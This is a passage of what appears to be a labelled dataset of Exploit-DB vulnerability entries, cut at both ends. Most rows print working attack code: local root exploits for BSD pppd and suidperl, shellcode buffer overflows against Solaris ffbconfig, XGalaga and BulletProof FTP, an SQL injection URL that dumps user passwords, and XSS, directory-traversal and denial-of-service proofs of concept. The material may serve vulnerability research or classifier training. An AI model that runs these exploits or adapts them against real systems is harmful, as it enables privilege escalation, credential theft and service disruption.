for ($k=1;$k<$WINDOW_SIZE;$k++) 		{ 			$x=($good_a[$cand]*$x+$good_z[$cand]) % 65536;	 			if ($x==$res[$p]) 			{ 				last; 			} 		} 		if ($k<$WINDOW_SIZE) 		{ 			$pos+=$k; 			if ($pos>$max_pos) 			{ 				$max_pos=$pos; 				$best=$res[$p]; 			} 			next; 		}			 		 		# Not found in forward lookup. Try backward  		my $x=$res[$p]; 		my $k; 		for ($k=1;$k<$WINDOW_SIZE;$k++) 		{ 			$x=($good_a[$cand]*$x+$good_z[$cand]) % 65536;	 			if ($x==$res[$p-1]) 			{ 				last; 			} 		} 		if ($k<$WINDOW_SIZE) 		{ 			$pos-=$k; 			next; 		}			 		 		die ""Shouldn't get here...""; 	}  	#Forward 	my $val=$best;  	for (my $i=1;$i<=$PREDICT_SIZE;$i++) 	{ 		$val=((($good_a[$cand]*$val) % 65536)+$good_z[$cand]) % 65536; 		$pred{$val}=1; 	}  	#Backward 	my $a2=$inv_tab[$good_a[$cand]]; 	my $z2=((-$a2)*($good_z[$cand])) % 65536; 	$val=$best; 	for (my $i=1;$i<=$PREDICT_SIZE;$i++) 	{ 		$val=((($a2*$val) % 65536)+$z2) % 65536; 		$pred{$val}=1; 	} }  my $end_time=gettimeofday();  print ""Predicted possible next TRXID Values (dictionary order): \n"". 	join("" "",sort(keys %pred)).""\n\n"";  print ""Total "".(scalar(keys %pred))."" candidates found\n\n"";  print ""INFO: "".($end_time-$start_time)."" seconds elapsed\n"";",ISC,1
35304,"Oracle Java - Floating-Point Value Denial of Service source: https://www.securityfocus.com/bid/46091/info  Oracle Java is prone to a remote denial-of-service vulnerability.  Successful attacks will cause applications written in Java to hang, creating a denial-of-service condition.  This issue affects both the Java compiler and Runtime Environment.   Send a Java Program Into An Infinite Loop  Compile this program and run it; the program will hang (at least it does on a 32-bit system with the latest JRE/JDK):  class runhang { public static void main(String[] args) {   System.out.println(""Test:"");   double d = Double.parseDouble(""2.2250738585072012e-308"");   System.out.println(""Value: "" + d);  } }  Send the Java Compiler Into An Infinite Loop  Try to compile this program; the compiler will hang:  class compilehang { public static void main(String[] args) {   double d = 2.2250738585072012e-308;   System.out.println(""Value: "" + d);  } }",Oracle,1
21669,"FreeBSD 4.x / NetBSD 1.4.x/1.5.x/1.6 / OpenBSD 3 - pppd Arbitrary File Permission Modification Race Condition source: https://www.securityfocus.com/bid/5355/info  A vulnerability has been reported in some versions of the pppd daemon included with multiple BSD distributions.  A race condition error in the code may result in the pppd process changing the file permissions on an arbitrary system file. pppd will generally run as a privileged user.  This issue has been reported in OpenBSD versions 3.0 and 3.1. Earlier versions of OpenBSD may share this vulnerability, this has not however been confirmed.   #!/usr/bin/perl  # Local root exploit for AnyBSD. Tested on my 4.3 FBSD homebox. # # (C) 2002 Sebastian Krahmer -- stealth at segfault dot net ;-)) # # NOT for abuse but for educational purposes only. # # Exploit description: # # The BSD pppd allows users to open any file even if its root owned. # It then tries to set apropriate terminal attributes on the filedescriptor # if a connection-script is given. As if it isn't bad enough that it allows # you to open roots console for example it also has a race: If the tcgetattr() # fails it calls some cleanup routines which use chown() to restore the mode # of the terminal (at least it ASSUMES it is an terminal). It should rather use # the tty_fd to restore the mode because between open() and tcgetattr failure+chown() # we link the file to /etc/crontab which will then have the mode of the former file # (which is probably 0666 :)  # Some code snippets. # # The vulnerable open(): # ... #        /* #         * Open the serial device and set it up to be the ppp interface. #         * First we open it in non-blocking mode so we can set the #         * various termios flags appropriately.  If we aren't dialling #         * out and we want to use the modem lines, we reopen it later #         * in order to wait for the carrier detect signal from the modem. #         */ #       while ((ttyfd = open(devnam, O_NONBLOCK | O_RDWR, 0)) < 0) { #            if (errno != EINTR) #                syslog(LOG_ERR, ""Failed to open %s: %m"", devnam); #            if (!persist || errno != EINTR) #                goto fail; #       } # ... # close_tty() which is called during cleanup because tcgetattr() of # the fd will fail: # # static void # close_tty() # { #    disestablish_ppp(ttyfd); # #   /* drop dtr to hang up */ #    if (modem) { #        setdtr(ttyfd, FALSE); #        /* #         * This sleep is in case the serial port has CLOCAL set by default, #         * and consequently will reassert DTR when we close the device. #         */ #        sleep(1); #    } # #    restore_tty(ttyfd); # #    if (tty_mode != (mode_t) -1) #        chmod(devnam, tty_mode); # #    close(ttyfd); #    ttyfd = -1; # } # # The chmod() bangs. # Fix suggestion: use fchmod() instead of chmod() and do not allow # users to open root owned files.    # ok, standard init ... umask 0;  chdir(""$ENV{HOME}""); system(""cp /etc/crontab /tmp/crontab"");  # create evil .ppprc to catch right execution path in pppd open O, "">.ppprc"" or die $!; print O ""/dev/../tmp/ppp-device\n"".         ""connect /tmp/none\n"";  close O;  print ""Starting ... You can safely ignore any error messages and lay back. It can take some\n"".       ""minutes...\n\n"";  # create a boomsh to be made +s create_boomsh();   # fork off a proc which constantly creates a mode 0666 # file and a link to /etc/crontab. crontab file will ""inherit"" # the mode then if (fork() == 0) { 	play_tricks(""/tmp/ppp-device""); }   # fork off own proc which inserts command into crontab file # which is then executed as root if (fork() == 0) { 	watch_crontab(); }  my $child;  # start pppd until race succeeds! for (;;) { 	if (($child = fork()) == 0) { 		exec (""/usr/sbin/pppd"");  	} 	wait; 	last if (((stat(""/tmp/boomsh""))[2] & 04000) == 04000); }  # ok, we have a lot of interpreters running due to fork()'s # so kill them... if (fork() == 0) { 	sleep(3); 	system(""killall -9 perl""); }  # thats all folks! ;-) exec(""/tmp/boomsh"");   ###  sub create_boomsh { 	open O, "">/tmp/boomsh.c"" or die $!; 	print O ""int main() { char *a[]={\""/bin/sh\"", 0}; setuid(0); "". 	        ""system(\""cp /tmp/crontab /etc/crontab\""); execve(*a,a,0); return 1;}\n""; 	close O; 	system(""cc /tmp/boomsh.c -o /tmp/boomsh""); }  sub play_tricks { 	my $file = shift; 	for (;;) { 		unlink($file); 		open O, "">$file""; 		close O;  		# On the OpenBSD box of a friend 0.01 as fixed value 		# did the trick. on my FreeBSD box 0.1 did. 		# maybe you need to play here 		select undef, undef, undef, rand 0.3; 		unlink($file); 		symlink(""/etc/crontab"", $file); 	} }  sub watch_crontab { 	for (;;) { 		open O, "">>/etc/crontab"" or next; 		print ""Race succeeded! Waiting for cron ...\n""; 		print O ""\n* * * * * root chown root /tmp/boomsh;chmod 04755 /tmp/boomsh\n"";  		close O; 		last; 	} 	exit;	 }",BSD,0
36001,Sitecore CMS 6.4.1 - 'url' Open Redirection source: https://www.securityfocus.com/bid/48930/info  Sitecore CMS is prone to a URI-redirection vulnerability because the application fails to properly sanitize user-supplied input.  Successful exploits may redirect a user to a potentially malicious site; this may aid in phishing attacks.  Sitecore CMS versions 6.4.1 rev. 110324 and prior are vulnerable.   http://www.example.com/sitecore/shell/default.aspx?xmlcontrol=Application&url=http://www.example.com&ch=WindowChrome&ic=Applications%2f32x32%2fabout.png&he=About+Sitecore&ma=0&mi=0&re=0,Sitecore,1
25747,"NPDS 4.8 < 5.0 - 'reply.php?image_subject' Cross-Site Scripting source: https://www.securityfocus.com/bid/13803/info       NPDS is affected by multiple vulnerabilities resulting from input validation errors. These issues may allow remote attackers to carry out HTML injection, cross-site scripting and SQL injection attacks.       This may result in the theft of authentication credentials, destruction or disclosure of sensitive data, and potentially other attacks.       All versions of NPDS are considered vulnerable to this issue at the moment.   http://www.example.com/reply.php?post=1&forum=1&topic=1&stop=2&image_subject=""><script>alert('je viens de recuperer ton cookie');</script>&userdata='&time='&poster_ip='&hostname='&message=test&submit=Valider",NPDS,0
19159,"Solaris 2.5.1 - 'ffbconfig' Local Privilege Escalation /* source: https://www.securityfocus.com/bid/202/info  The ffbconfig program is used to configure the Creator Fast Frame Buffer (FFB) Graphics Accelerator, which is a component of the FFB Configuration Software Package (SUNWffbcf). A buffer overflow condition has been discovered that may allow an unauthorized user to gain root access on the system.The ffbconfig program is used when the FFB Graphics accelerator card is installed. Thus, to test if a system is vulnerable, run the following command to see if the SUNWffbcf package is installed./usr/bin/pkginfo -l SUNWffbcfIf the package is not present, you will receive an error message stating that SUNWffbcf was not found. If it is present, ffbconfig is installed in /usr/sbin.The following versions of SunOS are affected:SunOS versions 5.5.1 and 5.5 SPARC running the Creator FFB Graphics Accelerator.  */  /* This works on Solaris 2.4 wiz /usr/sbin/ffbconfig from a Solaris 2.5 */    #include <stdio.h> #include <stdlib.h> #include <sys/types.h> #include <unistd.h>  #define BUF_LENGTH      128 #define EXTRA           256 #define STACK_OFFSET    128 #define SPARC_NOP       0xa61cc013  u_char sparc_shellcode[] = ""\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xda\xdc\xae\x15\xe3\x68"" ""\x90\x0b\x80\x0e\x92\x03\xa0\x0c\x94\x1a\x80\x0a\x9c\x03\xa0\x14"" ""\xec\x3b\xbf\xec\xc0\x23\xbf\xf4\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"" ""\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01"" ""\x91\xd0\x20\x08"" ;   u_long get_sp(void) {   __asm__(""mov %sp,%i0 \n""); }  void main(int argc, char *argv[]) {   char buf[BUF_LENGTH + EXTRA];   long targ_addr;   u_long *long_p;   u_char *char_p;   int i, code_length = strlen(sparc_shellcode),so;    long_p = (u_long *) buf;    for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++)     *long_p++ = SPARC_NOP;    char_p = (u_char *) long_p;    for (i = 0; i < code_length; i++)     *char_p++ = sparc_shellcode[i];    long_p = (u_long *) char_p;   targ_addr = get_sp() - STACK_OFFSET;   for (i = 0; i < EXTRA / sizeof(u_long); i++)     *long_p++ =targ_addr;    printf(""Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n"", targ_addr,BUF_LENGTH,EXTRA,STACK_OFFSET);    execl(""/usr/sbin/ffbconfig"", ""ffbconfig"", ""-dev"", buf,(char *) 0);   perror(""execl failed""); }",ffbconfig,0
71,"XGalaga 2.0.34 (RedHat 9.0) - Local Game /* 0x333xgalaga => XGalaga 2.0.34 local game exploit (Red Hat 9.0) * * tested against xgalaga-2.0.34-1.i386.rpm * under Red Hat Linux 9.0 * * - bug found by Steve Kemp * - exploit coded by c0wboy @ 0x333 * * (c) 0x333 Outsider Security Labs / www.0x333.org * */   #include <stdio.h> #include <string.h> #include <unistd.h>   #define BIN ""/usr/X11R6/bin/xgalaga"" #define SIZE 264  #define RET 0xbffffe2c /* tested against Red Hat Linux 9.0 */ #define NOP 0x90   unsigned char shellcode[] =  /* setregid (20,20) shellcode */ ""\x31\xc0\x31\xdb\x31\xc9\xb3\x14\xb1\x14\xb0\x47"" ""\xcd\x80""  /* exec /bin/sh shellcode */  ""\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"" ""\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"";   void banner (void); void memret (char *, int, int, int);   void banner (void) { fprintf (stdout, ""\n\n --- xgalaga local GAME exploit by c0wboy ---\n""); fprintf (stdout, "" --- Outsiders Se(c)urity Labs / www.0x333.org ---\n\n""); }   void memret (char *buffer, int ret, int size, int align) { int i; int * ptr = (int *) (buffer + align);  for (i=0; i<size; i+=4) *ptr++ = ret;  ptr = 0x0; }   int main () { int ret = RET; char out[SIZE];  memret ((char *)out, ret, SIZE-1, 0);  memset ((char *)out, NOP, 33); memcpy ((char *)out+33, shellcode, strlen(shellcode));  setenv (""HOME"", out, 1);  banner (); execl (BIN, BIN, ""-scores"", 0x0); // the switch ""-scores"" is necessary to exploit the game }  // milw0rm.com [2003-07-31]",.0x333.,0
35449,"BulletProof FTP Client 2010 - Local Buffer Overflow (SEH) (Ruby) #!/usr/bin/env ruby # Exploit Title: BulletProof FTP Client 2010 - Buffer Overflow (SEH) Exploit # Date: Dec 03 2014 # Vulnerability Discovery: Gabor Seljan # Exploit Author: Muhamad Fadzil Ramli <mind1355[at]gmail.com> # Software Link: http://www.bpftp.com/ # Version: 2010.75.0.76 # Tested on: Microsoft Windows XP SP3 EN [Version 5.1.2600] # CVE: CVE-2014-2973 # Notes: bypass stack size limitation for bigger payload. Allocate 2nd # shellcode in heap and copy back to stack. This exploit use egghunter # to locate 2nd shellcode in heap and copy to stack using memcpy function.  # Offset seh = 93 filename = ""xsession.bps"" buff = ""A"" * 400  # ./msfvenom -p windows/messagebox TEXT=""Hello Exploit-DB"" EXITFUNC=process -b '\x00\x0a\x0d\x1a' -e x86/shikata_ga_nai -f ruby heap_sc = ""w00tw00t"" + ""\xba\xaa\x8c\x8e\xda\xdb\xd3\xd9\x74\x24\xf4\x5f\x2b\xc9"" + ""\xb1\x44\x31\x57\x14\x83\xef\xfc\x03\x57\x10\x48\x79\x57"" + ""\x31\x17\x5b\x1c\xe2\xd3\x6d\x0f\x58\x6c\xbf\x66\xf9\x19"" + ""\xce\x48\x89\x6b\x3d\x22\xfb\x8f\xb6\x72\x0c\x24\xb6\x5a"" + ""\x87\x0c\x7f\xd4\x8f\x05\x8c\xb3\xae\x34\x8d\xa5\xd1\x3d"" + ""\x1e\x02\x36\xca\x9a\x76\xbd\x98\x0c\xff\xc0\xca\xc6\xb5"" + ""\xda\x81\x83\x69\xda\x7e\xd0\x5e\x95\x0b\x23\x14\x24\xe5"" + ""\x7d\xd5\x16\x39\x81\x85\xdd\x79\x0e\xd1\x1c\xb6\xe2\xdc"" + ""\x59\xa3\x09\xe5\x19\x17\xda\x6f\x03\xdc\x40\xb4\xc2\x09"" + ""\x12\x3f\xc8\x86\x50\x65\xcd\x19\x8c\x11\xe9\x92\x53\xce"" + ""\x7b\xe0\x77\x12\x1d\x2b\xc5\x22\xf4\x7f\xa3\xd6\x8f\xbd"" + ""\xdc\x96\xde\x4f\xf1\xf5\x36\xd0\xf6\x05\x39\x67\x4d\xfe"" + ""\x7d\x09\x96\x1c\xf2\x72\x3a\xc5\xa7\x94\xcd\xfa\xb7\x9b"" + ""\x5b\x41\x40\x0b\x30\x26\x70\x8a\xa0\x85\x42\x22\x55\x82"" + ""\xd7\x49\xf0\x20\x90\xf1\xde\xce\x29\xef\x49\x30\x7c\xeb"" + ""\xfc\x0c\x2f\x48\x56\x32\x9d\x12\x20\x2f\x3a\x38\xc7\x31"" + ""\xbd\x43\xe8\xda\x2e\xc3\x4f\x3b\xd9\x52\x17\x5e\x5b\xfc"" + ""\x9a\xc5\x28\x8f\x15\xdd\x47\x33\x72\xeb\xde\x28\x12\xb3"" + ""\xc0\x8e\xc3\x2b\x75\xe3\x47\xee\x1d\x8b\x2b\x81\xb4\x03"" + ""\xdb\x7d\x02\xab\x4b\x36\xe9\x27\xe0\xf7\x38\x3f\xb4\xd3"" + ""\xaa\xb6\xa4\x2d\x19\x9a\x75\x1f\xcf\xe5\xaa\xae\x2f\x49"" + ""\xb4\x84\xa7""  # badchar '\x00\x0a\x0d\x1a\xb1\x83\xb2' # only locate 1st heap address :P heap_addr = ""\x50"" + # push eax ""\xbb\xaf\x77\x77\x77"" + # mov ebx,777777afh ""\x81\xeb\x7f\x77\x77\x77"" + # sub ebx,7777777fh ""\x64\x8b\x1b"" + # mov ebx,dword ptr fs:[ebx] ""\xb9\x0f\x78\x77\x77"" + # mov ebx,7777780Fh ""\x81\xe9\x7f\x77\x77\x77"" + # sub ecx,7777777fh ""\x8b\x1c\x0b"" + # mov ebx,dword ptr [ebx+ecx] ""\x8b\x1b"" #  mov ebx,dword ptr [ebx]  egghunter = ""\x8b\xd3\xeb\x05"" + # mov edx,ebx # jmp $+7h ""\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"" + ""\x3c\x05\x5a\x74\xef\xb8"" + ""\x77\x30\x30\x74"" + # our tag 'w00t' ""\x8b\xfa\xaf\x75\xea\xaf"" + ""\x75\xe7""  memcpy_func = ""\x58"" + # pop eax # esp ""\x81\xc4\x54\xf2\xff\xff"" + # add esp,-3500 ""\xb9\xef\xe6\x3b\xef"" + # mov ecx,0xef3be6ef ""\x81\xe9\x7f\x77\x77\x77"" + # sub ecx,0x7777777f ""\x89\x08"" + # mov [eax],ecx # memcpy() static address ""\x89\xc1"" + # mov ecx,eax ""\x83\xc1\x10"" + # add ecx,10h ""\x89\x48\x04"" + # mov [eax+4h],ecx # void *dest ""\x89\x48\x08"" + # mov [eax+8h],ecx # void *dest ""\x89\x78\x0c"" + # mov [eax+0ch],edi # const wchar_t *src (shellcode) ""\xb9\x8d\x79\x77\x77"" + # mov ecx,0x7777798d ""\x81\xe9\x7f\x77\x77\x77"" + # sub ecx,0x7777777f ""\x89\x48\x10"" + # mov [eax+10h],ecx # size_t count ""\x94\xc3"" # xchg eax,esp # retn  stack_sc = heap_addr + egghunter + memcpy_func  # GetPC buff[1,2] = ""\xd9\xeb""                      # fldpi buff[3,5] = ""\x9b\xd9\x74\x24\xf4""          # fstenv [esp-0xc] buff[8,1] = ""\x58"" # pop eax                # pop esp into eax  # FixRet stub  buff[9,7] = ""\xc7\x40\x44\x45\x45\x45\x45""  # (1) buff[16,7] = ""\xc7\x40\x58\x45\x45\x45\x45"" # (2) place holder for jmp buff[23,7] = ""\xc7\x40\x5c\x45\x45\x45\x45"" # (3) place holder for ppr  buff[30,stack_sc.size] = stack_sc  # restore 1st shellcode buff[12,4] = buff[seh-24,4]                 # replace with original sc (1) buff[19,4] = buff[seh-4,4]                  # replace with original sc (2) buff[26,4] = buff[seh,4]                    # replace with original sc (3)  buff[seh-4,4] = ""\xeb\xa6\x41\x41"" # jmp $-166 buff[seh,4] = [0x72d11f39].pack('V').force_encoding(""utf-8"") # ppr : msacm32.drv only non-safeseh without null  bps = ""\x54\x68\x69\x73\x20\x69\x73\x20\x61\x20\x42\x75"" + ""\x6C\x6C\x65\x74\x50\x72\x6F\x6F\x66\x20\x46\x54"" + ""\x50\x20\x43\x6C\x69\x65\x6E\x74\x20\x53\x65\x73"" + ""\x73\x69\x6F\x6E\x2D\x46\x69\x6C\x65\x20\x61\x6E"" + ""\x64\x20\x73\x68\x6F\x75\x6C\x64\x20\x6E\x6F\x74"" + ""\x20\x62\x65\x20\x6D\x6F\x64\x69\x66\x69\x65\x64"" + ""\x20\x64\x69\x72\x65\x63\x74\x6C\x79\x2E\x0D\x0A"" + buff + ""\x0D\x0A\x61\x6E"" + ""\x6F\x6E\x79\x6D\x6F\x75\x73\x0D\x0A"" + heap_sc + ""\x62\x70\x69"" + ""\x63\x70\x6C\x6E\x6B\x69\x69\x62\x6D\x66\x65\x0D"" + ""\x0A""  File.open(filename,""wb"") do |fp|   fp.write(bps)   puts ""Exploit file: #{filename} size: #{bps.size}""   fp.close end",.bpftp.,1
45249,"Epiphany Web Browser 3.28.1 - Denial of Service (PoC) # Exploit Title: Epiphany Web Browser 3.28.1 - Denial of Service (PoC) # Author: Dhiraj Mishra # Date: 2018-08-23 # Software: https://projects-old.gnome.org/epiphany/ # Version: 3.28.1 # CVE: N/A # Tested on: Ubuntu 18 64bit  # Steps to reproduce: 1. Open epiphany browser 2. Bookmark any random page 3. Then navigate to bookmark properties set:     Name = Crash     Address = javascript:window.open('javascript:document.write(""<script></script>"");'); 4. Browser any URL's and try to open the above bookmark 5. The browser crashes  # Below backtrace for your reference.  $ gdb epiphany GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git Copyright (C) 2018 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html> This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law.  Type ""show copying"" and ""show warranty"" for details. This GDB was configured as ""x86_64-linux-gnu"". Type ""show configuration"" for configuration details. For bug reporting instructions, please see: <http://www.gnu.org/software/gdb/bugs/>. Find the GDB manual and other documentation resources online at: <http://www.gnu.org/software/gdb/documentation/>. For help, type ""help"". Type ""apropos word"" to search for commands related to ""word""... Reading symbols from epiphany...(no debugging symbols found)...done. (gdb) r Starting program: /usr/bin/epiphany  [Thread debugging using libthread_db enabled] Using host libthread_db library ""/lib/x86_64-linux-gnu/libthread_db.so.1"". [New Thread 0x7fffe08b6700 (LWP 9295)] [New Thread 0x7fffdee4b700 (LWP 9296)] [New Thread 0x7fffde64a700 (LWP 9297)] [New Thread 0x7fffdcdcf700 (LWP 9298)] [New Thread 0x7fff8fffd700 (LWP 9299)] [New Thread 0x7fff8f7fc700 (LWP 9300)] [New Thread 0x7fff8effb700 (LWP 9301)] [New Thread 0x7fff8e38b700 (LWP 9302)] [New Thread 0x7fff8db8a700 (LWP 9303)] [New Thread 0x7fff8d389700 (LWP 9305)] [New Thread 0x7fff77b0a700 (LWP 9310)] [New Thread 0x7fff7598c700 (LWP 9320)] [New Thread 0x7fff7518b700 (LWP 9321)] [New Thread 0x7fff7498a700 (LWP 9327)] [New Thread 0x7fff7698c700 (LWP 9334)] [New Thread 0x7fff5ffff700 (LWP 9335)] [New Thread 0x7fff5f7fe700 (LWP 9336)] [New Thread 0x7fff5effd700 (LWP 9337)] [New Thread 0x7fff5e7fc700 (LWP 9338)] [New Thread 0x7fff5dffb700 (LWP 9339)] [Thread 0x7fff8db8a700 (LWP 9303) exited] [Thread 0x7fff8e38b700 (LWP 9302) exited] [Thread 0x7fff5e7fc700 (LWP 9338) exited] [Thread 0x7fff7698c700 (LWP 9334) exited] [Thread 0x7fff5f7fe700 (LWP 9336) exited] [Thread 0x7fff5effd700 (LWP 9337) exited] [Thread 0x7fff5dffb700 (LWP 9339) exited] [Thread 0x7fff5ffff700 (LWP 9335) exited] Error scanning plugin /usr/lib/mozilla/plugins/libpepflashplayer.so, /usr/lib/x86_64-linux-gnu/webkit2gtk-4.0/WebKitPluginProcess returned 256 exit status [New Thread 0x7fff5ffff700 (LWP 9399)] [Thread 0x7fff7498a700 (LWP 9327) exited] [New Thread 0x7fff7498a700 (LWP 9402)] [Thread 0x7fff7498a700 (LWP 9402) exited]  Thread 22 ""pool"" received signal SIGSEGV, Segmentation fault. [Switching to Thread 0x7fff5ffff700 (LWP 9399)] 0x00007ffff7b75db7 in ?? () from /usr/lib/x86_64-linux-gnu/epiphany-browser/libephymain.so (gdb) bt #0  0x00007ffff7b75db7 in  () at /usr/lib/x86_64-linux-gnu/epiphany-browser/libephymain.so #1  0x00007ffff7079be6 in  () at /usr/lib/x86_64-linux-gnu/libgio-2.0.so.0 #2  0x00007ffff73fe7d0 in  () at /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0 #3  0x00007ffff73fde05 in  () at /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0 #4  0x00007fffefc206db in start_thread (arg=0x7fff5ffff700) at pthread_create.c:463 #5  0x00007ffff5e4c88f in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:95 (gdb)",Epiphany,1
20103,"AnalogX SimpleServer:WWW 1.0.6 - Directory Traversal source: https://www.securityfocus.com/bid/1508/info  Requesting a specially formed url containing encoding (%2E) to SimpleServer 1.06 and possibley earlier versions, will enable a remote user to gain read access to known files above the SimpleServer directory.  http://target/%2E%2E/filename",AnalogX,1
20142,"SUIDPerl 5.00503 - Mail Shell Escape (2) source: https://www.securityfocus.com/bid/1547/info   The interaction between some security checks performed by suidperl, the setuid version of perl, and the /bin/mail program creates a scenario that allows local malicious users to execute commands with root privileges.   The suidperl program performs a number of checks to make sure it can't be fooled into executing a perl script with root privileges when its not suid root. When one of these checks fails the program will compose a message to the root user. The mail message looks like this:   From: Bastard Operator <root@nimue.tpi.pl> To: root@nimue.tpi.pl   User 500 tried to run dev 769 ino 343180 in place of dev 769 ino 343183! (Filename of set-id script was /some/thing, uid 500 gid 500.)   Sincerely, perl   The name of the script to execute (inserted into the message) is taken from the program's argument list (argv[1]). suidperl executes /bin/mail to inject the message into the mail system. It does so without cleaning the environment or dropping its root privileges. The /bin/mail program has an undocumented feature. By setting the environment variable ""interactive"" to any value, /bin/mail will interpret the sequence ""~!"" as an escape sequence to start a shell and execute commands even when the program is not attached to a terminal. The environment variable ""interactive"" can be also set from ~/.mailrc with a ""set interactive"" line.   A malicous user can create a file with an escape sequence and commands embedded in the file name, then execute suidperl in such a way that the security check fails. suidperl will send a message to root via /bin/mail with the escape sequence embedded in the message. This will cause /bin/mail to start a root shell and execute the commands.  #!/bin/sh  # #    -- PLEASE READ THESE COMMENTS CAREFULLY BEFORE TRYING ANYTHING -- # # Wonderful, lovely, world-smashing, exciting perl exploit. It works against # +s suidperl, exploiting undocumented /bin/mail feature when perl wants to # notify root on inode race conditions. Currently, tested under RH Linux. # # What's probably most shocking, buggy code has following comment inside: # /* heh, heh */. I guess author wasn't laughning last. # # Development history of this exploit is really funny. I found this condition # about 4 months ago, but thought it's useless (who wants to notify root?). # I deleted my test code and didn't left any notes on it. Then, month after # this discovery, Sebastian contacted me. He was working on perl exploit. # He told me he don't know how to cause this condition to happen, but # if he realise how he can do it, he'll be able to use undocumented /bin/mail # feature - environmental variable 'interactive', which, if set, causes # /bin/mail to interpret ~! commands (subshell requests) even if stdin is not # on terminal. And then I understood what I've done. I spent next month # (yes! no kidding!) trying to recall what the fsck was the condition. I # remembered it was trivial, even annoying... And finally, now I'm able to # reconstruct it. # # This exploit tries to fit in rather short, but reasonable time window in # order to exploit it. I tested it on fast, not overloaded Linux box, and # I guess on slow machines it needs tunning. It needs anything setuid # (/usr/bin/passwd is just fine), writable working directory and something # around 4 minutes. Working directory should be mounted without noexec or # nosuid options (if so, find something like /var/lib/svgalib etc). # # WARNING: On slow machines, it's quite possible this exploit will cause # heavy load. Please test it when system is not overloaded and not used # (eg. at night). # # # I'd like to thank Sebastian Krahmer for his help (in fact, HE discovered it # - I think I can say it without shame), and especially thank to several of # my braincells that survived monitor radiation and made me recall this # race condition. # # Send comments, ideas and flames to <lcamtuf@ids.pl> # Tested with sperl 5.00503, but should work with any other as well. # # Good luck and don't abuse it. #  clear  echo ""Suidperl 5.00503 (and newer) root exploit"" echo ""-----------------------------------------"" echo ""Written by Michal Zalewski <lcamtuf@dione.ids.pl>"" echo ""With great respect to Sebastian Krahmer..."" echo  SUIDPERL=/usr/bin/suidperl SUIDBIN=/usr/bin/passwd  echo ""[*] Using suidperl=$SUIDPERL, suidbin=$SUIDBIN...""  if [ ! -u $SUIDPERL ]; then   echo ""[-] Sorry, $SUIDPERL4 is NOT setuid on this system or""   echo ""    does not exist at all. If there's +s perl binary available,""   echo ""    please change SUIDPERL variable within exploit code.""   echo   exit 0 fi   if [ ! -u $SUIDBIN ]; then   echo ""[-] Sorry, $SUIDBIN is NOT setuid on this system or does not exist at""   echo ""    all. Please pick any other +s binary and change SUIDBIN variable""   echo ""    within exploit code.""   echo   exit 0 fi  echo ""[+] Checks passed, compiling flares and helper applications..."" echo  cat >flare <<__eof__ #!/usr/bin/suidperl  print ""Nothing can stop me now...\n"";  __eof__  cat >bighole.c <<__eof__ main() {   setuid(0);   setgid(0);   chown(""sush"",0,0);   chmod(""sush"",04755); } __eof__  cat >sush.c <<__eof__ main() {   setuid(0);   setgid(0);   system(""/bin/bash""); } __eof__  make bighole sush  echo  if [ ! -x ./sush ]; then   echo ""[-] Oops, seems to me I cannot compile helper applications. Either""   echo ""    you don't have working 'make' or 'gcc' utility. If possible,""   echo ""    please compile bighole.c and sush.c manually (to bighole and sush).""   echo    exit 0 fi  echo ""[+] Setting up environment...""  chmod 4755 ./flare  FILENAME='none  ~!bighole  ' export interactive=1 PATH=.:$PATH  echo ""[+] Starting exploit. It could take up to 5 minutes in order to get"" echo ""[+] working root shell. WARNING - WARNING - WARNING: it could cause"" echo ""[+] heavy system load.""  while :; do   ( ln -f -s $SUIDBIN ""$FILENAME"";usleep $RANDOM; nice -n +20 $SUIDPERL ./""$FILENAME"" <./flare & ) &>/dev/null &   ( usleep $RANDOM ; ln -f -s /dev/stdin ""$FILENAME"" ) &>/dev/null &   if [ -u ./sush ]; then     echo     echo ""[+] VOILA, BABE :-) Entering rootshell...""     echo     rm -f ""$FILENAME"" sush.c bighole bighole.c flare     ./sush     echo     echo ""[+] Thank you for using Marchew Industries / dupa.ryba products.""     echo     rm -f ""$FILENAME"" sush.c bighole bighole.c flare sush     exit 0   fi done",SUIDPerl,0
10497,"File Share 1.0 - SQL Injection ##########################- Alg3r!eN H4xoRz -######################  [-]            FILE SHARE V 1.0  SQL Injection Vulnerability [-] Author    : TOP SAT 13 [-] MAIL      : topsat13@live.fr<mailto:topsat13@live.fr>  'Or'   Dz8@live.com<mailto:Dz8@live.com>  ############################################################/  [ Software Information ]  [/] Vendor : http://www.script-ati.com [/] script   : FILE SHARE V 1.0 [/] Download : http://www.script-ati.com<http://www.script-ati.com/> [/] Vulnerability : php SQL injection [/] Dork :inurl:""inurl:file.php?recordID=""                        ""FILE SHARE V 1.0""  ############################################################/ [ Vulnerable File ]  http://server/path/file.php?recordID=[ t o p S q l ]  [ Exploit ]  http://server/path/file.php?recordID=xx+union+select+1,group_concat(id,0x3a3a,nom,0x3a3a,pass),3,4,5,6,7,8,9,10+from+mombre--  [  Gr44ts ]  [~]: cRuT$Y - DeR_KOniG - Hunter Hacker - DOWNWOW - Dr.orYX - Cr3w-Dz - PMXs  & All My Muslims Hackerz :[~]",.script-ati.,0
18230,"Family CMS 2.7.2 - Multiple Persistent Cross-Site Scripting Vulnerabilities FCMS_2.7.2 cms and earlier multiple stored XSS Vulnerability =================================================================================== # Exploit Title: FCMS_2.7.2 cms multiple stored XSS Vulnerability  Download link :http://sourceforge.net/projects/fam-connections/files/Family%20Connections/2.7.2/FCMS_2.7.2.zip/download  # Author: Ahmed Elhady Mohamed  # Category:: webapps  # Tested on: windows XP Sp2 En  ===================================================================================    #First we must install all optional sections during installation process.          #############################################Stored XSS################################################################            page : messageboard.php?thread=1	  	 decription: if you ADD javascript code in "" reply "" field , the code will execute in "" profile.php?member=1 "" page.   	page : 